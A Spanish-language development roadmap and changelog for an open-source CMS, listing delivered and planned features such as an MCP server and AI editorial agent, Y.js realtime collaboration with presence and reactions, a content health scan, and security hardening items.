- [x] **AI moderation thresholds** — `getModerationThresholds(workspaceId)` lee de `settings`. `thresholdToStatus(score, thresholds)`. UI `/admin/ajustes/seguridad/moderacion` con sliders bidireccionales, ZoneVisualizer SVG, predicción de zonas + histórico real.
- [x] **Branch protection avanzada (cierra F9b L1)** — `branches.protectionConfig` jsonb (4 reglas: requireReviewers, requireApprovers, requireCommentsResolved, requireStatusApproved). `evaluateBranchProtection()` devuelve blockers. `mergeBranch` aplica gate antes del claim, NO bypassable con `force`. UI `/admin/branches/[id]/protection` con form + checklist en vivo + activity log.
- [x] **API keys audit log timeline UI** — `/admin/api-keys/[id]` con KPIs (hoy/total/rate-limit/última), sparkline 14 días bicolor (success/error), tabla 100 últimas calls con filtros status (2xx/4xx/5xx) + método. Export CSV via `/api/admin/api-keys/[id]/audit.csv`. Botón rotate inline mostrando nueva key.
- [x] **Rate limit AI Inline + cost cap por workspace** — Tabla `ai_usage_daily` con UPSERT atómico (UNIQUE con `COALESCE(user_id,'')`). Helper `src/ai/usage.ts` con `checkAiBudget` (per-user daily + monthly workspace) y `recordAiUsage`. Pre-flight check en `/api/admin/ai/inline` → 429 + Retry-After. UI `/admin/ajustes/ia` con KPIs, progress bar + form de budget/alert/hardBlock + breakdown por feature + top users.
- [x] **OWASP top-10 audit** — Subagent dirigido auditó codebase contra OWASP Top 10 (2021). **Resultado: NO CRITICAL ISSUES FOUND**. Postura defensiva de F10a parte 2 confirmada SECURE en A01-A09. Documentado en `tasks/lessons.md` sección "F10a OWASP audit".

#### Diferidos a F10d/F10e (no críticos)
- [ ] CSP enforce real (cambiar `CSP_ENFORCE=1` en prod cuando reports estén limpios ≥7 días).
- [ ] BotID dep instalada (`npm i @vercel/botid` cuando se decida activar).
- [ ] AI cost real (vs estimado 5_000 micros/call) cuando provider devuelva tokens consumidos.
- [ ] CSV export de activity_log workspace-wide (paralelo al de api-keys).

### F10b — Realtime Collaborative Editing
> Sanity Live solo está hosted. Nosotros: open-source self-hostable. Wow factor para teams.

- [ ] **Y.js + y-websocket self-host** en `/api/collab/[entryId]` (Edge runtime con WebSocket Vercel Functions o Node fluid compute con upgrade).
- [ ] **Presence en editor**: avatars cluster en topbar (max 5 visibles + "+N"), color por user (hashed deterministic).
- [ ] **Remote cursors + selections** con label nombre — TiptapCollaborationCursor extension.
- [ ] **Following mode**: click avatar → tu viewport sigue al usuario (scroll + zoom-to-block).
- [ ] **CRDT persistence**: snapshot Y.Doc cada 30s a `entries.body_json` (debounced); reconcilia con autosave actual.
- [ ] **Awareness de comments live**: nuevos comentarios aparecen sin reload.
- [ ] **SSE cross-instancia con Postgres LISTEN/NOTIFY** (resuelve F9c L1/L7) — `notify_channel_workspace_${wsId}` para notifications fanout entre instancias Vercel Fluid Compute.
- [ ] **Mentions email** (Resend) cuando user mencionado offline (cierra F9b L5).
- [ ] Liveblocks free como fallback opcional vía env `LIVEBLOCKS_SECRET`.

### F10c — MCP Server + AI Editorial Agent ⭐ EL DIFERENCIADOR
> Nadie en el espacio CMS open-source ofrece esto en 2026.

#### CSM MCP Server — Parte 1 (entregada 2026-05-04) ✅
- [x] **Servidor MCP standalone** con `@modelcontextprotocol/sdk` v1.29. **Modos:** stdio (Claude Desktop / Cursor / IDE local) + Streamable HTTP (Cursor remoto / serverless / web). Mismo build, sólo cambia transport.
- [x] **Auth** vía `Authorization: Bearer csm_live_…` (HTTP) o env `CSM_API_KEY` (stdio). Reusa `verifyKey` del REST API y respeta scopes existentes (`entries:read`/`write`/`publish`, `media:read`, etc.). Scope universal: `mcp:any`.
- [x] **Actor resolver** (`src/mcp/actor.ts`): para tools que mutan, resuelve el user de audit log en cascada — creator de la API key → owner más antiguo → primer admin. Audit log dispara con `meta.source: "mcp"` para distinguir de operaciones humanas.
- [x] **12 tools registradas** (todas multi-tenant safe):
  - `workspace_info` · stats + plan + locales
  - `entry_search` · híbrida BM25 + vectorial (RAG-ready)
  - `entry_list` · filtros status/locale/q + counts por status
  - `entry_get` · por id o slug+collection
  - `entry_create` · draft con title+collection+locale
  - `entry_update` · title/slug/excerpt/status/scheduledAt/seo + `bodyMarkdown` (conversor MD→Tiptap doc embebido)
  - `entry_publish` · idempotente, con flag `republish`
  - `collection_list` · esquema + counts
  - `taxonomy_list` · category/tag
  - `branch_list` · branches con stats
  - `media_search` · ILIKE en key/alt/caption
  - `subscriber_list` · status/locale/limit
- [x] **Markdown→Tiptap doc** in-house — un agente LLM puede producir markdown plano y `entry_update bodyMarkdown` lo convierte a doc Tiptap (headings, listas, code blocks, blockquotes, párrafos). Sin tener que conocer el formato interno.
- [x] **CLI** `csm mcp serve` + `csm mcp install --client=claude-desktop|cursor|vscode` — el install detecta plataforma, crea el directorio del cliente si no existe, hace merge con config previa (no la borra), y escribe la entrada `mcpServers.csm` con `command/args/env` correctos.
- [x] **Endpoint HTTP** `/api/mcp` (Streamable HTTP, stateless) — POST/GET/DELETE. `WebStandardStreamableHTTPServerTransport` se integra nativo con Next.js Route Handlers (Web Standard Request/Response).
- [x] **`bin/csm-mcp.mjs`** — bootstrap node→tsx para que Claude Desktop ejecute `node /ruta/csm-mcp.mjs` sin compilación previa. Soporta `CSM_API_KEY_FILE` para sandboxes/CI que no quieren la key en env.
- [x] **UI `/admin/mcp`** — discovery page con tabs Claude Desktop / Cursor / VS Code / HTTP, copy-to-clipboard de comandos y configs JSON, lista visual de los 12 tools con scope + flag "muta". Sidebar admin con icono Plug.

#### Agente Editorial in-product (entregado 2026-05-04) ✅
> Mismos tools del MCP server pero conversacional dentro del admin. Demo del valor del MCP sin abrir Claude Desktop.
- [x] **`/admin/agente`** — chat UI estilo Claude.ai/ChatGPT con burbujas user/assistant, tool-call cards plegables (input + output JSON), indicador "pensando" con dots, suggestions iniciales, Stop / Limpiar.
- [x] **Loop de tool-use Anthropic puro** (`src/agent/loop.ts`, ~280 líneas) — sin AI SDK ni LangChain. Hard-cap 8 iteraciones. Stream NDJSON al cliente con `text` deltas + `tool_call` + `tool_result` + `done`/`error`. Mock determinista si no hay `ANTHROPIC_API_KEY`.
- [x] **Reusa los 12 tools del MCP** vía `buildAgentSession({workspaceId, userId})` que genera una `McpSession` "in-product" con `directActorId` (audit log apunta al user real, sentinel `apiKeyId: "agent:<userId>"` para distinguir).
- [x] **`zodToJsonSchema`** convierte el `inputSchema` ZodRawShape de cada tool a JSON Schema Anthropic. Cero duplicación de definiciones.
- [x] **Endpoint** `/api/admin/ai/agent` — auth cookie + role≥editor, validación Zod del payload, abort signal propagado al fetch Anthropic.
- [x] **Sidebar** admin: nuevo entry "Agente" con icono Bot junto a Ask CSM.

#### Content Health Scan (entregado 2026-05-04) ✅
> Único en CMS open-source 2026: cron weekly que escanea todo el contenido y produce score + issues accionables. Inspirado en Lighthouse pero para contenido editorial.
- [x] **Schema** — 2 tablas nuevas (`entry_health` 1:1 con entries, `entry_health_issues` N:1) + 2 enums (`health_severity` low/medium/high/critical, `health_issue_type` 9 tipos). Drizzle push aplicado.
- [x] **Detectores síncronos** (`src/health/detectors.ts`) — seo_title_length (30-70 chars), seo_meta_missing (100-170 chars), thin_content (<300 palabras), missing_alt (walks Tiptap doc), heading_hierarchy (detecta saltos H1→H3), outdated_date (regex es-ES con 3 patrones: "en 2021"/"01/02/2021"/"marzo de 2021").
- [x] **Motor scan** (`src/health/scan.ts`) — `scanEntry({entry, force?})` idempotente con `inputHash` SHA-256 (no re-escanea si nada cambió). Transacción atómica (DELETE issues + INSERT batch + UPSERT snapshot). `scanWorkspace` itera published entries en lotes de 25.
- [x] **Cron weekly** `/api/cron/health-scan` lunes 02:00 UTC, `maxDuration: 300`, schedule en `vercel.json`.
- [x] **Dashboard `/admin/salud`** — 4 KPI cards (avg score, escaneadas, issues abiertos, críticos/altos), score ring SVG con gradient color, agrupación por tipo de issue, tabla con filtros (todas/críticas/altas/medias/bajas), botón "Re-escanear todo" + per-entry, ScoreBadge con color por rango (≥85 verde / ≥65 ámbar / <65 destructive).
- [x] **Server actions** — `rescanEntryAction` (síncrono, force=true), `rescanWorkspaceAction` (puede tardar minutos), `dismissIssueAction` (false positive, no borra audit).
- [x] **Sidebar** "Salud" con icono Heart en sección General.
- [x] **2 nuevos tools MCP** (total: 14):
  - `health_summary` — score + issues por severidad/tipo + worst N entries (read-only)
  - `entry_health_scan` — escanea + devuelve issues legibles (idempotente)
- [x] **Agente in-product** suggestions actualizadas: *"¿Cómo está la salud de mi contenido?"* y *"Dime los 3 posts con peor score y por qué"* — el agente ahora puede explicar issues y sugerir fixes conversacionalmente.

#### CSM MCP Server — Parte 2 (pendiente)
- [ ] **Tools adicionales**: `entry_schedule` (alias semántico de update), `entry_delete`, `branch_create`/`branch_merge`/`branch_diff`, `media_upload_from_url`, `media_generate_alt` (vision), `taxonomy_create`/`taxonomy_assign`, `og_generate`, `seo_audit`, `campaign_create`/`campaign_send`, `ab_test_create`/`ab_test_results`, `analytics_query` (read-only DSL).
- [ ] **Resources** MCP: `csm://entry/{id}`, `csm://collection/{slug}/entries`, `csm://workspace/info`.
- [ ] **Prompts predefinidos**: "weekly content recap", "broken links audit", "SEO improvement suggestions", "translate-this-post-to-X".
- [ ] **Sessionful HTTP** + EventStore para resumibilidad cuando un agente largo se reconecta.
- [ ] Rate-limit por API key + audit log de cada call MCP en `api_key_audit`.
- [ ] **DOCS** dedicado en `/admin/api-docs/mcp` con ejemplos curl, Cursor remoto y prompts útiles.

#### Editorial AI Agent (durable workflow)
- [ ] **Vercel Workflow DevKit** (WDK) — install + setup. Crash-safe pause/resume.
- [ ] **Workflow `weeklyContentPipeline`**: input = `{ ws, topic, count, tone, schedule }` → steps (research, draft, SEO optimize, generate cover, generate OG, schedule, notify reviewer).
- [ ] **Workflow `autoTranslate`**: trigger en branch creada con label `i18n` → AI traduce a N idiomas configurables → COW per-locale → reviewer asignado per-locale.
- [ ] **Workflow `contentHealthScan`**: cron weekly → todo el contenido → broken links + outdated facts (vs date) + accessibility (alt missing) + SEO (title length, meta desc) → reporte en `/admin/salud-contenido`.
- [ ] **Workflow `abTestDesigner`**: input = entry → AI propone 3 variantes de título/hero → lanza A/B test → cron diario evalúa significancia → al alcanzar p<0.05 con >100 conv promueve winner.
- [ ] **UI `/admin/agente`** — chat con el agent + historial de runs + cost por run.

### F10d — Performance + PWA + Edge-first
> Lighthouse 100x4 + PWA offline + RUM propio. Web Vitals como gate de CI.

#### Lighthouse 100/100/100/100
- [ ] Audit en `/`, `/blog/[slug]`, `/[locale]/...` con CI gate (script `pnpm lighthouse`).
- [ ] Bundle analyzer (`@next/bundle-analyzer`) — admin < 250KB initial, público < 90KB.
- [ ] Dynamic imports en admin: Tiptap, Page Builder, Tremor charts, dnd-kit.
- [ ] Image optimization audit: AVIF/WebP forzado, responsive sizes (320/640/960/1280/1920), blurhash en TODOS los temas, lazy loading correcto.
- [ ] Font subset + preload Geist Sans en sitio público.
- [ ] Edge runtime audit para `/`, `/blog/...`, `/api/og/...` (ya parcial).

#### PWA + offline drafts
- [ ] **Manifest + service worker** (`next-pwa` o custom) con caching por estrategia (NetworkFirst para HTML, CacheFirst para assets).
- [ ] **Dexie (IndexedDB)** para drafts offline en editor — autosave local cada 5s + sync al reconectar.
- [ ] Install prompt + "Trabajar offline" toggle en topbar admin.
- [ ] Offline indicator + queue de saves pendientes con retry.
- [ ] Mobile-first: editor usable en móvil con bottom toolbar.

#### Real User Monitoring propio (sustituye Vercel Analytics)
- [ ] Edge log endpoint `/api/ingest/rum` — captura LCP, CLS, INP, TTFB + URL + ws + UA hash.
- [ ] Tabla `rum_events` con cron agregador diario → `rum_daily` por (ws, url, dow).
- [ ] Dashboard `/admin/analiticas/performance` con Tremor: percentiles p50/p75/p95, evolución semanal, top URLs lentas.
- [ ] Web Vitals budget en CI: fail si p75 LCP > 1.5s en `/blog/...`.

### F10e — Operability + Scale + Data hardening
> Lo que hace que el CMS aguante producción real.

#### Backups
- [ ] **Cron diario** `pg_dump` → Vercel Blob (privado). Retención 30d. Tabla `backups` con metadata.
- [ ] **Restore endpoint admin-only** + dry-run validation.
- [ ] Backup test mensual (cron) que valida integridad del último dump.

#### Audit log + activity feed exportable
- [ ] Refactor activity_log para incluir TODOS los eventos críticos (auth, settings, billing, branch, workflow).
- [ ] Export CSV/JSON desde `/admin/ajustes/auditoria`.
- [ ] Filter por user/type/date.

#### Retention policies
- [ ] Cron diario: `ab_events` >90d → agregar a `ab_results_daily` y borrar raw.
- [ ] Cron diario: `notifications` read >30d → delete.
- [ ] Cron weekly: `revisions` per entry retiene últimas 50 + última publicada.
- [ ] Cron weekly: `branch_activity` >180d archive.

#### Diferidos F9c
- [ ] Paginación cursor en `/admin/calendario` (L5).
- [ ] Paginación cursor en `/admin/workflows` (L5).
- [ ] Paginar `listEntryEvents` a 50 (L4).
- [ ] Filter `isNull(entries.branchId)` en calendar workload (L2).
- [ ] Filter `isNull(entries.branchId)` en SLA sweep (L3).
- [ ] Workflow templates UI por colección — `/admin/colecciones/[id]/workflow` editor (L8).
- [ ] Bulk transitions throttle / batch cola (L9).
- [ ] iCal token revoke endpoint dedicado (L10).
- [ ] `Notification` type rename → `EditorialNotification` (L11).

#### Diferidos F9a
- [ ] Imports residue cleanup (terms/redirects/media) — track targetIds por kind en import_items (L1).
- [ ] Imports ownership check (revert solo creator+admin) (L2).
- [ ] Magic-bytes validation en upload imports (L4).
- [ ] errorLog append en lugar de overwrite (L5).

#### Diferidos F9b
- [ ] Branch restore (papelera) — UI `/admin/branches/papelera` con N días retención (L2).
- [ ] Rebase explícito (traer cambios de main a branch) (L3).

### F10f — Launch Polish + Spectacular Demo
> El último 5% que decide la primera impresión.

#### Seed data espectacular
- [ ] 1 blog real "Diario CSM" con 3 posts (cover IA via Replicate Flux, contenido real con IA inline).
- [ ] 1 portfolio "Estudio Kairós" con 4 proyectos.
- [ ] 1 docs site "CSM Docs" con 6 páginas (Quick Start, Conceptos, API, CLI, MCP, Recipes).
- [ ] 1 newsletter "Boletín Espectacular" con 10 subscribers fake + 1 campaign enviada.
- [ ] 1 landing hero con A/B test activo.
- [ ] 1 form "Contacto" con 3 submissions demo.
- [ ] 1 workflow demo (post en "review" asignado a 2 usuarios).
- [ ] Branch demo con conflicto resuelto (showcase del wow factor F9b).

#### README + Marketing
- [ ] **README en español** con GIFs animados (uno por wow moment): editor IA inline, page builder, branching, MCP server desde Claude, AI agent, Y.js presence.
- [ ] Badges (CI, license, Lighthouse, npm, deploy).
- [ ] Screenshots del admin en dark mode.
- [ ] **Landing en `/`** con hero + 5 sections (editor / builder / IA / MCP / deploy).
- [ ] Video walkthrough 3min.

#### Deploy
- [ ] **Migrar `vercel.json` → `vercel.ts`** (recomendado 2026, full TypeScript, dynamic logic).
- [ ] **Deploy to Vercel button** funcional con env wizard (Neon, Resend, UploadThing, Stripe optional).
- [ ] `.env.example` exhaustivo con todas las keys + descripción + link a docs del proveedor.
- [ ] Custom domain auto-SSL flow probado E2E.
- [ ] Health check endpoint `/api/health` (db ping + provider checks).

#### Onboarding pulido
- [ ] AI Site Generator end-to-end: usuario describe idea → IA genera todo (workspace, branding, posts demo, navegación, hero copy) en < 30s.
- [ ] Tour interactivo `/admin/tour` (5 steps).
- [ ] Empty states con ilustraciones SVG + CTA.

## 2026-05-04 — F10b Bloque 1 ✅ entregado

> Y.js + LISTEN/NOTIFY + Tiptap collab básico funcionando 2-tabs. Cierra F9c L1+L7 (notifications cross-instancia). Sin Hocuspocus extra: provider custom SSE+POST que arranca en Vercel out-of-the-box.

### Schema (drizzle push aplicado)
- [x] `collab_snapshots` (entryId PK, workspaceId, state base64, bytes, updatedAt)
- [x] `collab_updates` (entryId, workspaceId, update base64, clientId, userId, createdAt) + index `(entryId, createdAt)`

### Pubsub cross-instancia
- [x] `src/lib/pubsub.ts` — Postgres LISTEN/NOTIFY helper. 1 conexión long-lived por instancia (`max:1`, idle_timeout:0, prepare:false). Auto-stripping del sufijo `-pooler.` para Neon (LISTEN no funciona sobre el pooler). Subscriptores locales se suman a un Set por canal; primer sub abre el LISTEN, los siguientes son in-memory fanout. Publish via `pg_notify(channel, json)` por la misma conexión.
- [x] Refactor `src/editorial/notifications.ts` (cierra F9c L1+L7) — el bus in-memory bucket-keyed por `(ws,user)` ahora se monta sobre un único LISTEN por workspace `notif:ws:{wsId}`. Ref-counting para auto-release del LISTEN. La emisión publica el row serializado en JSON; los listeners locales filtran por `userId` antes de entregar al SSE.

### Y.js server-side
- [x] `src/collab/server.ts`:
  - `checkEntryAccess(entryId, wsId)` — gate workspace
  - `loadInitialState(entryId, wsId)` — devuelve `{snapshot:base64|null, updates:base64[], bodyJson}`. Si no hay nada (primer cliente), incluye `entries.body` para sembrar.
  - `appendUpdate({entryId, wsId, userId, clientId, update})` — INSERT + NOTIFY. Tras N updates (50) o T (30s) dispara `compactSnapshot` en background.
  - `publishAwareness({entryId, clientId, update, user})` — NOTIFY efímero, NO persiste.
  - `compactSnapshot(...)` — applyUpdate todos los pending → encodeStateAsUpdate → UPSERT en `collab_snapshots` → DELETE updates `lte(cutoff)`. Idempotente entre instancias (último UPDATE gana, CRDT-equivalente).
  - `base64ToUint8` / `uint8ToBase64` Buffer-aware.
- [x] Canales: `collab:up:{entryId}` (updates) y `collab:aw:{entryId}` (awareness).
- [x] Cap MAX_UPDATE_BYTES = 64KB.

### Endpoints
- [x] `GET /api/collab/[entryId]/events` — SSE. Eventos: `connected`, `init` (snapshot+updates+bodyJson), `update` (binary remoto), `awareness` (presence/cursor remoto), `heartbeat` 25s. Cleanup en abort + send-failure.
- [x] `POST /api/collab/[entryId]/update` — body Zod `{clientId, update:base64}`. requireWorkspace("author").
- [x] `POST /api/collab/[entryId]/awareness` — body Zod incluye `user:{id,name,color,role,avatarUrl?}`. **Hardening: `body.user.id !== session.user.id` → 403** (anti-suplantación de presence).

### Provider client-side
- [x] `src/collab/provider.ts` — `CollabProvider` class custom. EventSource para SSE (auto-reconnect con backoff exponencial cap 30s). POST coalesced 50ms para updates (`Y.mergeUpdates`). POST coalesced 80ms para awareness. `sendBeacon` en `beforeunload` con awareness null para limpiar presence. Color determinístico hash(userId) → paleta 10 colores.
- [x] `src/collab/use-collab.ts` — hook React. `Y.Doc` único por mount (useRef), instancia el provider, expone `{doc, status, peers, setOnSeed}`. Awareness `change` → setPeers().

### Editor
- [x] `EditorShell` recibe nuevo prop `currentUser:{id,name,image,role}`. Llama `useCollab` y mete `Collaboration.configure({document: collab.doc})` en el array de extensions. Apaga `StarterKit.undoRedo` (Tiptap 3) — Collaboration trae undo manager Y.js.
- [x] `setOnSeed` callback que ejecuta `editor.commands.setContent(body, {emitUpdate:true})` SOLO cuando el server confirmó que no había snapshot ni updates. Primer cliente siembra desde `entries.body`; siguientes reciben snapshot/updates y aplican via Y.applyUpdate.
- [x] Header: nuevo `<CollabIndicator status peerCount/>` antes del SaveIndicator. Muestra "Conectando…" / "En vivo" / "N personas más editando" / "Offline".
- [x] `page.tsx` pasa `currentUser` con `id`, `name||email`, `image`, `ctx.role`.

### Validación
- [x] typecheck verde
- [x] biome check verde (organize-imports + format auto-fix aplicado, no warnings)
- [x] next build verde (solo warning ignorable de `@aws-sdk/client-s3` opcional pre-existente)
- [x] El autosave existente sigue funcionando: `editor.on("update")` dispara `saveEntry` con `editor.getJSON()` que refleja el merged Y.Doc; cada peer guarda idempotentemente el mismo contenido convergido.

## 2026-05-04 — F10b Bloque 2 ✅ entregado

> Cursors remotos + presence avatars cluster en topbar editor. Tiptap `CollaborationCursor` enchufado al awareness de nuestro provider custom.

### Wire de cursors
- [x] `npm i @tiptap/extension-collaboration-cursor@3.0.0` (peer dep `@tiptap/core@^3.0.0`).
- [x] **Refactor `useCollab`**: Y.Doc + Awareness se crean sincronamente con `useRef` (estaban diferidos al useEffect del provider, lo que rompía el primer render del editor). El provider deja de instanciar Awareness internamente — lo recibe del hook (`opts.awareness`).
- [x] Provider escribe DOS campos en awareness:
  - `user` (name + color) — lo posee `CollaborationCursor` para renderizar caret/label.
  - `csmUser` (id, name, color, role, avatarUrl) — para presence cluster + audit.
  Esto evita que CollaborationCursor sobrescriba nuestros campos extendidos en su `mount` interno.
- [x] `useCollab` lee `csmUser` con fallback a `user` por compatibilidad con peers que no tengan nuestro provider.
- [x] `Awareness.destroy()` movido al `useEffect` final del hook (ya no en el `provider.destroy()` que se llama en cada cleanup de conexión).
- [x] Editor monta `CollaborationCursor.configure({ provider: { awareness: collab.awareness }, user: { name, color } })`.

### CSS de cursors
- [x] `editor-styles.css` — bloque dedicado:
  - `.collaboration-cursor__caret` con `border-left: 2px solid var(--peer-color)`.
  - `.collaboration-cursor__label` posicionado top, fondo color del peer, fade-out 3s tras cambio (animación `csm-cursor-fade`).
  - `:hover` muestra label permanente.
  - `.collaboration-cursor__selection` con `mix-blend-mode: multiply` + `opacity: 0.4` para legibilidad sobre cualquier fondo del editor.

### Presence avatars cluster
- [x] `src/components/admin/editor/presence-avatars.tsx` — componente standalone:
  - `<PresenceAvatars peers max={4} onJumpToPeer />`.
  - Hasta 4 avatars visibles + chip "+N" para overflow.
  - Avatar con color de fondo del peer + iniciales blancas (drop-shadow para legibilidad).
  - Si hay `avatarUrl`, lo pinta como `background-image` (scape `\` `'` `"` con `cssEscape`) para evitar `<img>` vs `<Image/>` y XSS via avatar URL.
  - Tooltip on hover: nombre + rol humanizado ("Editor", "Autor", "Admin", "Owner", "Lector").
  - `onJumpToPeer` opcional (lo cablearé en B3 al following mode).
- [x] Topbar editor: `<PresenceAvatars peers={collab.peers} max={4}/>` antes del `CollabIndicator`. Solo se renderiza si hay peers.

### Validación
- [x] typecheck verde
- [x] biome verde (corrección: aria-label="" inválido → `aria-hidden`; `Awareness` import como type)
- [x] next build verde

## 2026-05-04 — F10b Bloque 3 ✅ entregado (EL DIFERENCIADOR)

> Presence en TODO el admin + following mode + reactions live en threads. Único en CMS open-source 2026.

### Schema (drizzle push aplicado)
- [x] `presence_sessions` (id, workspaceId, userId, clientId, route, entryId, lastSeenAt) + UNIQUE `(ws, clientId)` + index `(ws, lastSeenAt)` + partial index `(ws, entryId) WHERE entryId IS NOT NULL`.
- [x] `editorial_reactions` (id, ws, messageId, threadId, userId, emoji, createdAt) + UNIQUE `(messageId, userId, emoji)` + index `(threadId, createdAt)`.

### Backend presence
- [x] `src/presence/server.ts` — UPSERT heartbeat (key: `(ws, clientId)`), `entryIdFromRoute(path)` regex `/admin/contenido/{uuid}`, `listActivePresence(ws)` con join a users (ventana 60s), `purgeStalePresence()` cleanup 5min, NOTIFY canal `presence:ws:{wsId}` con payload tipado.
- [x] Endpoints:
  - `POST /api/admin/presence/heartbeat` (15s desde el cliente)
  - `POST /api/admin/presence/leave` (vía `sendBeacon` en `beforeunload`)
  - `GET /api/admin/presence/stream` SSE (init snapshot + presence + heartbeat 25s)

### Frontend presence
- [x] `src/presence/context.tsx` — `PresenceProvider` montado en admin layout. Heartbeat al cambiar pathname + interval 15s, sendBeacon en `pagehide`/`beforeunload`. clientId estable por pestaña (sessionStorage). SSE con `init`/`presence` events. Following mode: `setFollow(peer)` y al recibir `update` del peer, `router.push(peer.route)` si cambia.
- [x] `<PresenceStack mode={...} />` componente reusable: filtros `kind: "all" | "entry" | "route"`, max+overflow chip "+N", tooltip name+rol humanizado, color hashed, dot verde "live", click = follow.
- [x] `<FollowingBanner />` sticky bajo topbar con color del peer + botón detener.
- [x] `<HotRightNow />` widget dashboard: agrupa peers por `entryId`, ordena por concurrencia desc, top 5 con ring de gradient amber→rose, escapa al route del peer al click. NO renderiza si no hay actividad (evita widget vacío).
- [x] **Surfaces wired** (avatars en sitio):
  - `/admin/contenido` posts table — junto al título de cada fila (size 20, max 3).
  - `/admin/workflows` kanban — en cards entre el título y el grip handle (size 18, max 2).
  - `/admin/calendario` — en cards de mes/semana (size 14, max 2).
  - Dashboard `/admin` — `<HotRightNow/>` entre KPIs y TopPosts.

### Reactions live (cierra plan F10b "realtime reactions en comments")
- [x] `src/editorial/reactions.ts` — `toggleReaction({ws, messageId, emoji})` idempotente (DELETE if exists else INSERT) con whitelist regex `\p{Extended_Pictographic}|\p{Emoji_Component}|‍` (ZWJ joiner). Re-verifica `message ∈ thread ∈ workspace` defensa-en-profundidad. `loadReactionsForThreads({threadIds, myUserId})` agrega counts + `mine`.
- [x] Server action `toggleReactionAction(messageId, emoji)` en `workflows/_actions.ts`.
- [x] **NOTIFY al MISMO canal `presence:ws:{wsId}`** con `kind: "reaction.add"|"reaction.remove"`. Reusa el SSE existente — no monto otro stream.
- [x] `PresenceProvider` extendido: discrimina `kind` y dispatcha reactions a un Map `<threadId, Set<listener>>` interno. Expone `subscribeReactions(threadId, fn)`.
- [x] `<ThreadReactions threadId messageId myUserId initial>` componente con:
  - Optimistic update en click (toggle) + rollback en error.
  - Suscripción al stream de presence para `kind: reaction.*`.
  - Animación `animate-csm-pulse` (keyframes en globals.css) cuando llega un add live.
  - Picker de 6 emojis comunes (`👍 ❤️ 🎉 🚀 👀 🤔`).
  - Conteos por emoji con highlight si `mine`.
- [x] `EditorialDrawer` recibe `reactionsByMessage` y renderiza `<ThreadReactions>` bajo cada mensaje.
- [x] `/admin/contenido/[id]/page.tsx` carga `loadReactionsForThreads(threadIds, myUserId)` y agrupa por messageId.

### Validación
- [x] typecheck verde
- [x] biome verde (organize-imports + format auto-fix; corregido `role="dialog"` por accesibilidad)
- [x] next build verde

## 2026-05-04 — F10b Bloque 4 ✅ entregado · F10b CERRADO

> Mentions email Resend (offline-only) que cierra **F9b L5**, integrado en `notifyComment` sin doble-código en `createThread`/`replyToThread`.

### Implementación
- [x] `src/presence/server.ts`: añadido `whoIsOnline(ws, userIds)` que devuelve `Set<string>` con los IDs online (`lastSeenAt > now() - 60s`). Single query con `selectDistinct` filtrado por workspaceId.
- [x] `src/lib/email.ts`: nuevo `sendMentionEmail({to, recipientName, actorName, workspaceName, entryTitle, preview, url})`. Template HTML branded (gradient `#9b5cff → #ff5db1`) + `<blockquote>` con preview del comentario. **Escape de HTML en el preview** (replace `& < >`) para evitar HTML injection en email body. Fallback `text` plano para clientes sin HTML.
- [x] `src/editorial/comments.ts`: `notifyComment` ahora dispara `void emailOfflineMentions(...)` tras `emitNotificationsBatch`. La función helper resuelve email + name de los users mentioned + nombre del workspace en una query paralela (`Promise.all`), filtra por offline (vía `whoIsOnline`), construye URL absoluta con `NEXT_PUBLIC_APP_URL ?? https://${VERCEL_URL}` y dispara `sendMentionEmail` por cada uno con `.catch(() => {})` para que un fallo individual no afecte a otros.
- [x] **Best-effort**: el outer `.catch(() => {})` garantiza que el email NO rompe el flow del comment (los notifications + bell SSE siempre se envían primero).

### Decisión clave: NO email si está online
- Si el user mencionado está activo en el admin, el bell SSE en realtime ya lo notifica con audio + badge → email sería ruido.
- Solo offline (sin sesión presence en últimos 60s) recibe email.
- Esto cierra el patrón "ruido vs señal" → mentions actionable solo cuando el user no está mirando.

### Validación
- [x] typecheck verde
- [x] biome verde (auto-fix de format aplicado)
- [x] next build verde
- [x] Compatible con `features.email=false`: cuando no hay `RESEND_API_KEY`, `sendEmail` cae al mock y loggea preview a stdout (existente).

### F10b — Cierre global ✅
- [x] B1 ✅ Y.js infra + LISTEN/NOTIFY pubsub + Tiptap collab básico (cierra F9c L1+L7)
- [x] B2 ✅ CollaborationCursor + presence avatars editor
- [x] B3 ✅ Presence en TODO admin + following mode + reactions live (DIFERENCIADOR único 2026)
- [x] B4 ✅ Mentions email offline (cierra F9b L5)

### Stack final
- Y.js (`yjs`, `y-protocols`, `y-prosemirror` instalado para fallback)
- Tiptap collaboration (`@tiptap/extension-collaboration@3`, `@tiptap/extension-collaboration-cursor@3`)
- Postgres LISTEN/NOTIFY (cero deps adicionales)
- 4 nuevas tablas (`collab_snapshots`, `collab_updates`, `presence_sessions`, `editorial_reactions`)
- 7 nuevos endpoints (`/api/collab/[id]/{events,update,awareness}`, `/api/admin/presence/{stream,heartbeat,leave}`)
- Cero infra adicional (Vercel + Neon free tier es suficiente).

## 2026-05-05 — Plantillas Showcase Espectaculares ✅ entregado

> Salto cualitativo de las plantillas de página al nivel motionsites.ai: cada plantilla es ahora un **showcase component** custom con vídeo HLS, scroll-driven marquees, sticky stacking cards, parallax, glassmorphism, char-by-char text reveal, magnetic cursor, etc. Reemplaza el viejo preview block-based.

### Arquitectura
- `src/templates/showcase/_lib/primitives.tsx` — 9 primitives reusables (cero deps nuevas):
  - `FadeIn`, `Magnet`, `CycleText`, `AnimatedTextReveal`, `MarqueeRow` (scroll-driven o autoplay), `StickyStackCard`, `ParallaxColumn`, `VideoLoop` (crossfade entre loops), `LiquidGlass`, `Spotlight`, `LoadingScreen`.
  - Construidos sobre framer-motion 11 ya instalado: `useScroll`, `useTransform`, `useMotionValue`, `AnimatePresence`. Cero GSAP, cero hls.js.
- `src/templates/showcase/_lib/styles.css` — 9 vibe classes (jack, michael, asme, securify, targo, nimbus, substack, magazine, mint, docs) + Google Fonts via `@import` arriba del file (Kanit, Instrument Serif, Inter, Readex Pro, Rubik, Newsreader).
- `src/templates/showcase/_lib/assets.ts` — catálogo curado de URLs (vídeos cloudfront, GIFs motionsites, imágenes higgs, unsplash helpers).
- `src/templates/showcase/index.tsx` — map id → componente; helper `getShowcase(id)`.

### 8 plantillas showcase (1 por id existente)
- [x] `portfolio-spotlight` → **Jack 3D Creator**: hero magnético + portrait + marquee scroll-driven 21 GIFs en 2 filas opuestas + char-reveal about + 3D corners + services + 3 sticky stack cards.
- [x] `agency-spotlight` → **Michael Smith editorial dark**: loading screen + nav glass-pill + role cycling + bento 4 + journal pills + parallax columns 2 + stats + footer marquee gigante.
